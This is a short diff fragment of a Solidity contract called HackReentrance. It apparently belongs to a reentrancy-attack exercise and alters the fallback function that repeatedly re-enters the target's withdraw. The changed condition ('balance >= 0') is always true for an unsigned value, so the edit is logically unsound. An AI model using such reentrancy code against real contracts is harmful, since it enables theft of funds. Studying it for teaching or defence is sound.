@@ -20,7 +20,7 @@ contract HackReentrance {
   }
 
   fallback() external payable {
-    if(address(reentranceAddress).balance != 0){
+    if(address(reentranceAddress).balance >= 0){
       reentranceAddress.withdraw(amountToWithdraw);
     }
   }
